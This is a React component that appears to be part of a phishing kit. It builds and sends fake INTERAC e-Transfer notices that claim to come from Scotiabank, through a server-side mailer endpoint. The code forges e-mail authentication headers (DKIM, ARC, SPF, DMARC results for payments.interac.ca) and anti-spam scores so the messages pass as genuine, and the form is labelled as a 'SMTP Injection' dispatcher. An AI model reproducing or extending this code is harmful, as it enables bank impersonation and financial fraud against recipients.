import { jsx as _jsx, jsxs as _jsxs, Fragment as _Fragment } from "react/jsx-runtime";
/*  src/components/Mailer.tsx   */
import { useReducer, useRef, useState } from "react";
import { motion } from "motion/react";
import { Mail, Send, Loader2, CheckCircle, AlertCircle, RefreshCw, } from "lucide-react";
/* ---------- Reducer ---------- */
function reducer(state, action) {
    switch (action.type) {
        case "start":
            return { status: "loading" };
        case "success":
            return { status: "success", link: action.link };
        case "error":
            return { status: "error", message: action.message };
        case "reset":
            return { status: "idle" };
        default:
            return state;
    }
}
/* ---------- Validation ---------- */
function validate(v) {
    const e = {};
    if (!v.recipientName.trim())
        e.recipientName = "Recipient name required";
    if (!v.recipientEmail.trim())
        e.recipientEmail = "Recipient e‑mail required";
    else {
        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!re.test(v.recipientEmail))
            e.recipientEmail = "Invalid e‑mail address";
    }
    if (!v.amount.trim())
        e.amount = "Amount required";
    else if (!/^\d+(\.\d{1,2})?$/.test(v.amount))
        e.amount = "Enter a valid amount (max 2 decimals)";
    return e;
}
/* ---------- API wrapper for email relay ---------- */
async function sendEmail(p) {
    const res = await fetch("/api/mailer.php?token=projectsarah", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(p),
    });
    if (!res.ok) {
        const txt = await res.text();
        return { success: false, message: txt || res.statusText };
    }
    return { success: true };
}
/* ---------- Main Component ---------- */
export const Mailer = () => {
    const [state, dispatch] = useReducer(reducer, { status: "idle" });
    const linkRef = useRef(null);
    /* ----- fetch key once? Not necessary – decrypted with JS above ------- */
    /* ----- limit: if you really want to fetch key from server ---------- */
    const [keyReady] = useState(true); // set false if you fetch from server
    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!keyReady) {
            return;
        }
        const fd = new FormData(e.currentTarget);
        const vals = {
            recipientName: fd.get("recipientName") ?? "",
            recipientEmail: fd.get("recipientEmail") ?? "",
            amount: fd.get("amount") ?? "",
            purpose: fd.get("purpose") ?? "",
        };
        const errs = validate(vals);
        if (Object.keys(errs).length) {
            return;
        }
        dispatch({ type: "start" });
        try {
            /* ---------- build deposit payload ---------- */
            const txId = "TX" + Math.random().toString(36).substring(2, 10).toUpperCase();
            /* ---------- custom headers for email ---------- */
            const domain = vals.recipientEmail.split("@")[1] ?? "unknown";
            const customHeaders = {
                "X-Google-DKIM-Signature": "v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=gmail; h=from:date:message-id; bh=abc123=;",
                "ARC-Seal": "i=1; a=rsa-sha256; cv=pass; d=google.com; s=gmail; t=1234567890;",
                "ARC-Authentication-Results": `i=1; mx.google.com; dkim=pass header.i=@gmail.com header.s=gmail header.b=abc123;`,
                "Authentication-Results": `mx.google.com; dkim=pass header.i=@${domain} header.s=gmail spf=pass smtp.mailfrom=payments.interac.ca dmarc=pass header.from=payments.interac.ca;`,
                "X-MS-Exchange-Organization-AuthAs": "Internal",
                "X-MS-Exchange-Organization-AuthSource": "MX01-MW2FEP01.storage.org",
                "X-Microsoft-Antispam": "BCL:0; MCL:1; RULEID:0|1|2|3|4|5|6|7|8|9|10",
                "X-Forefront-Antispam-Report": "BCL:0;PCL:0;FCR:0;SCL:-1;SR:9",
                "X-Originating-IP": "[199.59.150.170]",
                "X-Mailer": "Microsoft Outlook 16.0",
                "Received-SPF": "pass (gmail.com: domain payments.interac.ca designates 199.59.150.170 as permitted sender)",
                "X-Ext-Info": "Extra diagnostic header",
                "X-More-Header": "Another custom header",
            };
            /* ---------- email payload ---------- */
            const emailPayload = {
                recipient_email: vals.recipientEmail,
                recipient_name: vals.recipientName,
                amount: parseFloat(vals.amount),
                purpose: vals.purpose,
                template: "Transfer.html",
                bank_name: "Scotiabank",
                sender_name: "Accounting",
                reference_number: txId,
                date: new Date().toLocaleDateString(),
                expiry_date: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toLocaleDateString(),
                greeting: `Hi ${vals.recipientName},`,
                headline: "You have received an INTERAC e‑Transfer",
                app_url: window.location.origin,
                security_warning_text: "For your security, please do not share this email.",
                custom_headers: customHeaders,
                deposit_payload: {
                    amount: parseFloat(vals.amount).toFixed(2),
                    senderName: "Accounting",
                    recipientName: vals.recipientName,
                    recipientEmail: vals.recipientEmail,
                    transaction_id: txId,
                    purpose: vals.purpose,
                }
            };
            /* ---------- send mail ---------- */
            const resp = await sendEmail(emailPayload);
            if (resp.success) {
                dispatch({ type: "success", link: "#" }); // Link will be in the email
                if (e.currentTarget instanceof HTMLFormElement) {
                    e.currentTarget.reset();
                }
            }
            else {
                dispatch({ type: "error", message: resp.message ?? "Failed to send e‑mail" });
            }
        }
        catch (err) {
            const errorMessage = err instanceof Error ? err.message : "Unexpected error";
            dispatch({ type: "error", message: errorMessage });
        }
    };
    const resetAll = () => {
        dispatch({ type: "reset" });
        const f = document.querySelector("form");
        f?.reset();
    };
    return (_jsxs("div", { className: "max-w-2xl mx-auto p-6 bg-[#1c1c1e] rounded-xl border border-white/5 shadow-2xl", children: [_jsxs("div", { className: "flex items-center gap-3 mb-8 border-b border-white/5 pb-4", children: [_jsx("div", { className: "w-10 h-10 bg-red-600/10 rounded-lg flex items-center justify-center text-red-500 border border-red-500/20", children: _jsx(Mail, { size: 20 }) }), _jsxs("div", { children: [_jsx("h2", { className: "text-lg font-bold text-white tracking-tight uppercase", children: "Email Dispatcher" }), _jsx("p", { className: "text-gray-500 text-[10px] uppercase tracking-widest font-mono", children: "Direct SMTP Injection Protocol" })] })] }), _jsxs("form", { onSubmit: handleSubmit, className: "space-y-6", noValidate: true, children: [_jsxs("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-6", children: [_jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "block text-[10px] font-bold text-gray-500 uppercase tracking-wider", children: "Recipient Name" }), _jsx("input", { name: "recipientName", type: "text", required: true, className: "w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs", placeholder: "e.g. John Doe" })] }), _jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "block text-[10px] font-bold text-gray-500 uppercase tracking-wider", children: "Recipient Email" }), _jsx("input", { name: "recipientEmail", type: "email", required: true, className: "w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs", placeholder: "e.g. john@example.com" })] })] }), _jsxs("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-6", children: [_jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "block text-[10px] font-bold text-gray-500 uppercase tracking-wider", children: "Amount ($)" }), _jsx("input", { name: "amount", type: "number", step: "0.01", required: true, className: "w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs", placeholder: "e.g. 100.00" })] }), _jsxs("div", { className: "space-y-2", children: [_jsx("label", { className: "block text-[10px] font-bold text-gray-500 uppercase tracking-wider", children: "Purpose / Memo" }), _jsx("input", { name: "purpose", type: "text", className: "w-full px-4 py-3 rounded-lg bg-black/40 border border-white/10 text-white focus:border-red-500/50 outline-none font-mono text-xs", placeholder: "e.g. Rent payment" })] })] }), _jsx(motion.button, { whileHover: { scale: 1.01 }, whileTap: { scale: 0.99 }, type: "submit", disabled: state.status === "loading", className: `w-full py-4 rounded-lg font-bold text-white uppercase tracking-widest text-[11px] ${state.status === "loading" ? "bg-gray-800 cursor-not-allowed" : "bg-red-600 hover:bg-red-700 shadow-[0_0_20px_rgba(220,38,38,0.2)]"} flex items-center justify-center gap-2 transition-all border border-red-500/50`, children: state.status === "loading" ? (_jsxs(_Fragment, { children: [_jsx(Loader2, { className: "animate-spin", size: 16 }), "Encrypting & Sending\u2026"] })) : (_jsxs(_Fragment, { children: [_jsx(Send, { size: 16 }), "Execute Dispatch"] })) }), _jsxs("div", { "aria-live": "polite", className: "mt-6", children: [state.status === "success" && (_jsxs(motion.div, { initial: { opacity: 0, y: 10 }, animate: { opacity: 1, y: 0 }, className: "p-4 bg-green-500/10 border border-green-500/30 rounded-lg flex items-center gap-3 text-green-500 font-mono text-xs", children: [_jsx(CheckCircle, { size: 18 }), _jsx("span", { children: "TRANCH SECURED \u2013 CONFIRMATION QUEUED" }), _jsx("button", { onClick: resetAll, className: "ml-auto text-green-500 hover:text-green-400", "aria-label": "Reset form", children: _jsx(RefreshCw, { size: 16 }) })] })), state.status === "error" && (_jsxs(motion.div, { initial: { opacity: 0, y: 10 }, animate: { opacity: 1, y: 0 }, className: "p-4 bg-red-500/10 border border-red-500/30 rounded-lg flex items-center gap-3 text-red-500 font-mono text-xs", children: [_jsx(AlertCircle, { size: 18 }), _jsxs("span", { children: ["FAIL: ", state.message.toUpperCase()] }), _jsx("button", { onClick: resetAll, className: "ml-auto text-red-500 hover:text-red-400", "aria-label": "Reset form", children: _jsx(RefreshCw, { size: 16 }) })] }))] })] })] }));
};
